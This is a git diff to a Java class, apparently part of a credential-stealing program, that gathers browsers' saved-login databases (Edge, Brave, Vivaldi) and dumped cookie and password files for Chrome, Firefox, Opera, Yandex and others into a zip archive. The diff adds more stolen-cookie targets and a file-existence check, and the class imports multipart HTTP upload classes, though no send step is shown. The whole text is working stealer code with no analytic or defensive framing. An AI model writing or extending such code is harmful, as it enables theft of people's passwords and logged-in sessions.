@@ -1,6 +1,5 @@
 package io.github.luxotick.impl;
 
-import io.github.luxotick.Sender;
 import io.github.luxotick.Start;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
@@ -32,7 +31,16 @@ public class Zip {
                 System.getenv("APPDATA") + "\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                 System.getenv("APPDATA") + "\\..\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                 System.getenv("APPDATA") + "\\..\\Local\\Vivaldi\\User Data\\Default\\Login Data",
-                "C:\\Users\\Public\\Documents\\dothack.dev"
+                "C:\\Users\\Public\\Documents\\dothack.dev",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\BRAVE.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\CHROME.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\EDGE.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\FIREFOX.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERA.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERA_GX.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\VIVALDI.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Passwords\\YANDEX.txt"
+                // Add this line to include the USER's Browsers folder
         };
 
         final List<String> srcFiles = Arrays.asList(sourcePaths);
@@ -43,19 +51,21 @@ public class Zip {
         for (int i = 0; i < srcFiles.size(); i++) {
             try {
                 File fileToZip = new File(srcFiles.get(i));
-                FileInputStream fis = new FileInputStream(fileToZip);
-                System.out.println(fileToZip.getPath());
-                String path = fileToZip.getPath();
-                String folderName = i < browserPaths.length ? browserPaths[i] : "Other";
+                if (fileToZip.exists()) { // Check if the file/folder exists
+                    FileInputStream fis = new FileInputStream(fileToZip);
+                    System.out.println(fileToZip.getPath());
+                    String path = fileToZip.getPath();
+                    String folderName = i < browserPaths.length ? browserPaths[i] : "Other";
 
-                zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
+                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
 
-                byte[] bytes = new byte[1024];
-                int length;
-                while((length = fis.read(bytes)) >= 0) {
-                    zipOut.write(bytes, 0, length);
+                    byte[] bytes = new byte[1024];
+                    int length;
+                    while ((length = fis.read(bytes)) >= 0) {
+                        zipOut.write(bytes, 0, length);
+                    }
+                    fis.close();
                 }
-                fis.close();
             } catch (Exception e) {
                 System.out.println("Error: " + e);
             }
